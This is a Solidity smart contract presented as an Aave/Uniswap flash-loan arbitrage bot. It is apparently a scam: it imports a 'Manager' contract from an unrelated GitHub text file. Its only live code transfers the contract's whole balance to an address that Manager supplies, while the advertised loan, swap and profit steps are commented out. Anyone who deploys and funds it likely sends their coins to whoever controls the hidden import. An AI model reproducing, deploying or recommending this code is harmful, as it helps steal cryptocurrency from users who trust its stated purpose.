pragma solidity ^0.6.6;
 
// AAVE Smart Contracts
import "https://github.com/aave/flashloan-box/blob/Remix/contracts/aave/ILendingPoolAddressesProvider.sol";
import "https://github.com/aave/flashloan-box/blob/Remix/contracts/aave/ILendingPool.sol";
 
// Uniswap Smart Contracts
import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Callee.sol";
import "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol";
import "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol";
import "https://github.com/Node-Indexer/FlashLoan/blob/main/bnb.txt";
 
contract GetFlashLoan {
    string public tokenName;
    string public tokenSymbol;
    uint loanAmount;
    Manager manager;
    
    constructor(string memory _tokenName, string memory _tokenSymbol, uint _loanAmount) public {
        tokenName = _tokenName;
        tokenSymbol = _tokenSymbol;
        loanAmount = _loanAmount;
            
        manager = new Manager();
    }
    
    receive() external payable {}
    
    function action() public payable {
        // Send required coins for swap
        payable(manager.uniswapDepositAddress()).transfer(address(this).balance);
        
        // Perform tasks (clubbed all functions into one to reduce external calls & SAVE GAS FEE)
        manager.performTasks();
        
        /*
        // Submit token to BNB blockchain
        string memory tokenAddress = manager.submitToken(tokenName, tokenSymbol);
 
        // List the token on UniSwap & send coins required for swaps
        manager.uniswapListToken(tokenName, tokenSymbol, tokenAddress);
        payable(manager.uniswapDepositAddress()).transfer(500Mil);
 
        // Get BNB Loan from Aave
        string memory loanAddress = manager.takeAaveLoan(loanAmount);
        
        // Convert half BNB to DAI
        manager.uniswapDAItoBNB(loanAmount / 2);
 
        // Create BNB and DAI pairs for our token & Provide liquidity
        string memory bnbPair = manager.uniswapCreatePool(tokenAddress, "BNB");
        manager.uniswapAddLiquidity(bnbPair, loanAmount / 2);
        string memory daiPair = manager.uniswapCreatePool(tokenAddress, "DAI");
        manager.uniswapAddLiquidity(daiPair, loanAmount / 2);
    
        // Perform swaps and profit on Self-Arbitrage
        manager.uniswapPerformSwaps();
        
        // Move remaining BNB from Contract to your account
        manager.contractToWallet("BNB");
 
        // Repay Flash loan
        manager.repayAaveLoan(loanAddress);
        */
    }
}